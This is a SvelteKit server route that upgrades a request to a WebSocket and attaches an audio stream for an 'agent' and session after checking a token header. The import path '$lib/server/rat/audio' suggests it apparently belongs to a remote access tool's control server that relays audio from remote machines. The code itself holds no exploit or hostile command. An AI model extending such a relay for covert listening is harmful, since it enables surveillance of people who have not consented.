import { error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { audioBridgeManager, AudioBridgeError } from '$lib/server/rat/audio';
import { AUDIO_STREAM_TOKEN_HEADER } from '../../../../../../../../shared/constants/protocol';

export const GET: RequestHandler = ({ request, params }) => {
	if (request.headers.get('upgrade')?.toLowerCase() !== 'websocket') {
		throw error(400, 'Expected WebSocket upgrade request');
	}

	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const url = new URL(request.url);
	const sessionId = url.searchParams.get('sessionId');
	if (!sessionId) {
		throw error(400, 'Missing session identifier');
	}

	const token = request.headers.get(AUDIO_STREAM_TOKEN_HEADER);
	if (!token) {
		throw error(401, 'Missing audio stream token');
	}

	// For Node.js/SvelteKit environments that support the 'upgrade' property in the Response.
	// If this is running under a SvelteKit adapter that doesn't support this directly,
	// it might need an adapter-specific hook (like in hooks.server.ts for handleHotUpdate or similar).
	// However, many modern adapters and environments (like Bun, or some Node adapters)
	// expect a 101 Switching Protocols response with a webSocket property.

	const pairFactory = (
		globalThis as unknown as {
			WebSocketPair: new () => { 0: WebSocket; 1: WebSocket };
		}
	).WebSocketPair;

	const { 0: client, 1: server } = new pairFactory();

	try {
		audioBridgeManager.attachBinaryStream(id, sessionId, token, server);
	} catch (err) {
		try {
			server.close(1011, 'Audio stream rejected');
		} catch {
			// ignore close errors
		}
		if (err instanceof AudioBridgeError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to attach audio stream');
	}

	return new Response(null, {
		status: 101,
		webSocket: client
	} as ResponseInit & { webSocket: WebSocket });
};
